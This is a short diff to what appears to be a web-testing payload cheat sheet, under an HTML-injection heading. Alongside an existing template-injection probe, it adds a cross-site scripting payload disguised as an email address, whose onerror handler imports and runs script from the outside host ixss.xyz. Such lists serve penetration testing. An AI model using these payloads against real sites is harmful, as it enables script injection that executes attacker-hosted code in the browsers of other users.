@@ -18,5 +18,10 @@ htmli
 ```
 \"/><h1>test{{7*7}}[[7*7]]
 ```
-
+```
+email@mycompany.com
+```
+```
+<img/src/onerror=import('//ixss.xyz')>@mycompany.com
+```
 
